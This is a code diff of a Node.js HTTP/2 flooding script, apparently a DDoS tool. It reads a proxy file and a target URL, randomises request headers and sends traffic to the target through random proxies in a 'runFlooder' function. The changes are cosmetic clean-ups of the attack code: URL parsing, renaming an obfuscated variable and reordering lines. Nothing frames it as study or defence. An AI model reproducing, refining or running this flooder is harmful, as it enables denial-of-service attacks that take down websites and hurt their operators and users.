@@ -2,7 +2,7 @@ const net = require('net');
 const http2 = require("http2");
 const tls = require('tls');
 const cluster = require('cluster');
-const url = require("url");
+const URL = require("url");
 const fs = require("fs");
 const crypto = require("crypto");
 const axios = require('axios');
@@ -2518,7 +2518,7 @@ var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
-const parsedTarget = url.parse(args.target);
+const parsedTarget = new URL(args.target);
 class NetSocket {
   constructor() {}
   async ['HTTP'](_0x5b2a5b, _0x37b110) {
@@ -2621,19 +2621,19 @@ headers['x-frame-options'] = randomHeaders["x-frame-options"];
 headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
 function runFlooder() {
   const proxyAddr = randomElement(proxies);
-  const parsedProxy = proxyAddr.split(':');
-  headers.origin = 'https://' + parsedTarget.host;
   headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
   headers["origin"] = "https://" + parsedTarget.host;
+  const parsedProxy = proxyAddr.split(':');
   headers[":authority"] = parsedTarget.host;
   headers["user-agent"] = moz + az1 + uap1;
-  const _0x50454d = {
+  const proxyDetails = {
     'host': parsedProxy[0],
-    'port': ~~parsedProxy[1],
+    'port': parsedProxy[1],
     'address': parsedTarget.host + ":443",
-    'timeout': 0x64
+    'timeout': 100
   };
-  Socker.HTTP(_0x50454d, (_0x9e698b, _0x19756f) => {
+
+  Socker.HTTP(proxyDetails, (_0x9e698b, _0x19756f) => {
     if (_0x19756f) {
       return;
     }
